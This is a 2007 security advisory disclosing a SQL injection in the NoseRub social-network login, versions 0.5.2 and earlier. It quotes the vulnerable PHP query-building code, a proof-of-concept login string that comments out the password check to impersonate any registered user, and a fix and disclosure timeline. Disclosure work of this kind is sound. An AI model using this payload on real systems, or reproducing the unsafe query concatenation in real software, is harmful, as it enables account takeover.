@@ -1,0 +1,121 @@
+############################################################################
+    -- ----------  ----           - ----------------------------
+          ---------- ----        --  -----------------------------
+           -------------           ---seclog- ------------------
+           ------------           --  ---   -------------------
+             ---------            ----    -------------------
+              -------             --------------------------
+              ---               --------------   -----------
+                ---            --------------     --   ---  -
+                   -  ---       --------------     -    --  -
+                     ----           ---------
+                    ----------       -------            - -    --
+                    ----------        ------                    -
+                      -------         ----- -             ---------
+                      ------           ----               ---------
+                      ---               --                       ---
+                      --                                          --
+############################################################################
+#                  seclog.de Security Advisory 2007-001                    #
+############################################################################
+
+
+            Advisory: NoseRub Login SQL Injection Vulnerability 
+   Affected Versions: <= 0.5.2
+      Fixed Versions: current SVN
+                Risk: critical
+  
+          Vendor URL: http://noserub.com
+       Vendor Status: informed, fixed version will be released soon
+        Advisory URL: http://seclog.de/pub/seclog-2007-001.txt
+     Advisory Status: public
+              Author: Felix Groebert <felix AT groebert DOT org>
+            Revision: 2007-12-26
+
+
+
+Introduction
+============
+  NoseRub is a protocol for and a sample implementation of a decentralized
+  social network.
+
+
+Vulnerability
+=============
+  The login script fails to validate user input. It is possible to insert
+  double quotes in order to escape the following SQL query:
+
+  SELECT `Identity`.`id`, `Identity`.`is_local`, [...]
+  FROM `identities` AS `Identity` WHERE `Identity`.`hash` = ''
+  AND `Identity`.`username` = "www.example.com/noserub/USERNAME"
+  AND `Identity`.`password` = 'f970e2767d0cfe75876ea857f92e319b' LIMIT 1
+
+  The query is generated at the end of the function check() in
+  app/models/identity.php:
+
+  return $this->find(array('Identity.hash' => '',
+              'Identity.username = "'. $username .'"', 
+              'Identity.password' => md5($data['Identity']['password'])));
+
+
+Proof of Concept
+================
+  The SQL injection bug can be exploited by impersonating a registered user.
+
+     Go to: http://www.example.com/noserub/pages/login/
+  Login as: somereallogin " -- "
+  Password: unknownpassword
+
+  This results in the following SQL query, commenting out the fourth and fifth
+  lines using double dashes, thus maintaining valid SQL syntax.
+
+  SELECT `Identity`.`id`, `Identity`.`is_local`, [...]
+  FROM `identities` AS `Identity` WHERE `Identity`.`hash` = ''
+  AND `Identity`.`username` = "www.example.com/noserub/somereallogin"
+  -- "" AND `Identity`.`password` = 'f970e2767d0cfe75876ea857f92e319b'
+  LIMIT 1
+
+
+Recommendation
+==============
+  It is recommended to upgrade to NoseRub > 0.5.2.
+  A preliminary patched version of the affected file can be downloaded from
+  SVN revision 515:
+  http://noserub.googlecode.com/svn/trunk/app/models/identity.php
+
+
+Disclosure Timeline
+===================
+  2007-12-19 Problem found
+  2007-12-19 Notified developers
+  2007-12-20 Received response with proposed fix
+  2007-12-20 Sent acknowledgment concerning fix
+  2007-12-26 Released advisory to public
+
+
+About seclog.de
+===============
+  seclog.de is not your average latest-vulnerability-weblog. We try to
+  deliver quality commentary on recent security news and issues. Our focus
+  ranges from secure programming, exploitation techniques, applied
+  cryptography, network security, privacy, biometrics to social engineering:
+  from the organizational and human layers to the physical and application
+  layers. The weblog is partly in english and german. Check it out.
+
+
+Disclaimer and Copyright
+========================
+  The author is not responsible for the misuse of the information provided in
+  this security advisory. Advisories are a service to the professional
+  security community. There are NO WARRANTIES with regard to this information.
+  Any application or distribution of this information constitutes acceptance
+  AS IS, at the user's own risk. This information is subject to change without
+  notice.
+
+  This advisory Copyright (C) 2007 Felix Groebert. Permission is hereby granted
+  to redistribute this advisory, providing that no changes are made and that
+  the copyright notices and disclaimers remain intact.
+
+############################################################################
+
+# milw0rm.com [2007-12-28]
